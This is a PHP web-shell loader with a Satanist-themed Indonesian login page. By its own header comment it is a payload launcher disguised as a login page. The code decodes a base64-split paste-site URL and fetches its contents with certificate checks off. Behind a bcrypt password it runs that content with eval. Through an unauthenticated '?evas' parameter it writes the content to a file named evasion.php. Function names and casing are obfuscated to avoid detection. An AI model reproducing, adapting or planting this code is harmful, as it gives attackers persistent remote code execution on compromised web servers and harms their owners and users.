<?php
/**
 * ======================================================================
 * SHADOW REVOLT LOADER
 * ======================================================================
 * A dark-styled payload launcher disguised as a rebellion login page.
 * Blends sinister UI with hidden eval-based code execution.
 *
 * STRUCTURE:
 *  - Login page: bloody dark with fire header, One Piece flag background,
 *    and mocking Indonesian quote against corruption.
 *  - ?wouwwee trigger: fetch + save file (no login required).
 *  - Default runner: protected by bcrypt login system.
 *
 * VISUAL:
 *  - Big flaming title above everything.
 *  - Quote (long, bloody, harsh) placed ABOVE login form card.
 *  - Login form styled as bloody ritual box.
 *  - Rat-in-suit image at bottom-right for symbolic mockery.
 * ======================================================================
 */

define('LOGIN_HASH', '$2a$10$LDb0PaZY494i/Jvx6NDUA.ywdUHINN9KchUPazxMxI5cLzdls2GJi');
define('LOGIN_COOKIE', 'shadow_gate');
define('LOGIN_EXPIRY', 3600);

function _compileFetchCoreLite($u) {
    if (function_exists('curl_version')) {
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $u);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
        $r = curl_exec($c);
        if (curl_errno($c)) { $e = curl_error($c); curl_close($c); throw new Exception("cURL Error: " . $e); }
        curl_close($c); return $r;
    }
    throw new Exception("cURL not available.");
}
function _compileExecPayloadTask($u) {
    $x = _compileFetchCoreLite($u);
    if ($x === false || trim($x) === '') throw new Exception("Empty or failed content.");
    EvAl("?>" . $x);
}
function _compileDecodeChunkUnit($d) { return bAse64_dEcoDe($d); }
function _compilePushToDiskNode($f, $c) { file_put_contents($f, $c); }

function _compileRenderLoginPage($quote) {
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <title>👿 PEMUJA SETAN 👿</title>
        <style>
            body {
                margin: 0;
                font-family: 'Courier New', monospace;
                background: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjpATdt-1VGCvwxRTfS3sSs6sUOw639O4OUeK6hSw8u8EpQjV_Oozbn6l1ThA2HX172OzYe-M6VnXu-JHsqrIBeoEhXOdEplqBhpZWW7om9BWOh866V5XkoBxDfrWoRrE0xuRTswi065LKvxiB8ITSTIlwH9z7T-yxmG5mIiSV4aI-b1SkVJ7JDITYgE9ak/w573-h573/Gemini_Generated_Image_p7a7ulp7a7ulp7a7.png') no-repeat center center fixed;
                background-size: cover;
                color: #fff;
                text-align: center;
                overflow: hidden;
            }
            .overlay {
                background: rgba(0,0,0,0.85);
                min-height: 100vh;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                padding: 30px;
            }
            h1.fire-title {
                font-size: 42px;
                color: #ff1c1c;
                text-transform: uppercase;
                margin-bottom: 20px;
                text-shadow: 0 0 10px #ff0000, 0 0 25px #ff3300, 0 0 40px #ff6600;
                animation: flame 2s infinite alternate;
            }
            @keyframes flame {
                from { text-shadow: 0 0 15px #ff0000, 0 0 30px #ff6600; }
                to { text-shadow: 0 0 25px #ff6600, 0 0 50px #ff3300; }
            }
            .quote {
                max-width: 800px;
                font-size: 16px;
                margin-bottom: 30px;
                line-height: 1.6;
                color: #ff4444;
                font-weight: bold;
                text-shadow: 0 0 10px #000, 0 0 15px #900;
                padding: 20px;
                border-left: 4px solid #ff0000;
                border-right: 4px solid #ff0000;
                background: rgba(20,0,0,0.6);
            }
            .login-box {
                background: rgba(20, 20, 20, 0.8);
                border-radius: 12px;
                padding: 30px;
                width: 320px;
                box-shadow: 0 0 20px #ff0000;
                border: 2px solid #660000;
            }
            .login-box input[type="password"] {
                width: 100%;
                padding: 12px;
                margin-bottom: 15px;
                border: none;
                border-radius: 6px;
                background: #111;
                color: #ff3333;
                font-size: 15px;
                outline: none;
                box-shadow: inset 0 0 10px #700;
            }
            .login-box button {
                width: 100%;
                padding: 12px;
                border: none;
                border-radius: 6px;
                background: linear-gradient(90deg, #ff0000, #660000);
                color: #fff;
                font-weight: bold;
                cursor: pointer;
                transition: 0.3s;
            }
            .login-box button:hover {
                background: linear-gradient(90deg, #ff2222, #990000);
                box-shadow: 0 0 20px #ff0000;
            }
            .rat {
                position: fixed;
                bottom: 10px;
                right: 10px;
                width: 100px;
                filter: drop-shadow(0 0 8px #ff0000);
                opacity: 0.9;
            }
        </style>
    </head>
    <body>
        <div class="overlay">
            <h1 class="fire-title">👿 Selamat Datang 👿</h1>
            <div class="quote">
                <?= htmlspecialchars($quote) ?>
            </div>
            <div class="login-box">
                <form method="post">
                    <input type="password" name="password" placeholder="Wahai Pengikut Pengikut Saya" required>
                    <button type="submit">Masuk</button>
                </form>
            </div>
        </div>
        <img class="rat" src="https://i.pinimg.com/originals/83/30/0d/83300dc55bac8bbcd3a3236bab21e66f.jpg" alt="Tikus Berdasi">
    </body>
    </html>
    <?php
}

function _compileAuthAndRun($payloadUrl) {
    if (isset($_COOKIE[LOGIN_COOKIE])) return _compileExecPayloadTask($payloadUrl);
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (password_verify($_POST['password'], LOGIN_HASH)) {
            setcookie(LOGIN_COOKIE, '1', time() + LOGIN_EXPIRY, "/");
            return _compileExecPayloadTask($payloadUrl);
        }
    }
    $quote = "Setan mewakili kepuasan, bukan pengekangan, Setan mewakili keberadaan vital, bukan mimpi spiritual yang tidak berdasar, Setan mewakili balas dendam, bukan pipi yang dibalikkan, Setan mewakili manusia sebagai binatang lain, kadang lebih baik, seringkali lebih buruk daripada yang berjalan di atas empat kaki, yang, karena 'perkembangan spiritual ilahi' dan intelektualnya, telah menjadi binatang yang paling ganas dari semuanya.";
    _compileRenderLoginPage($quote);
    exit;
}

if (isset($_GET['evas'])) {
    try {
        $p1 = 'aHR0cHM6Ly9wYXN0ZWZ5Lm';
        $p2 = 'FwcC93TUxCdno0ci9yYXc=';
        $url = _compileDecodeChunkUnit($p1 . $p2);
        $d = _compileFetchCoreLite($url);
        if ($d !== false && trim($d) !== '') { _compilePushToDiskNode('evasion.php', $d); echo "File created."; }
        else echo "No content.";
    } catch (Exception $e) { echo "Error: " . $e->getMessage(); }
    exit;
}

try {
    $r1 = 'aHR0cHM6Ly9wYXN0ZWZ5Lm';
    $r2 = 'FwcC93TUxCdno0ci9yYXc=';
    $u = _compileDecodeChunkUnit($r1 . $r2);
    _compileAuthAndRun($u);
} catch (Exception $e) { echo "Error: " . $e->getMessage(); }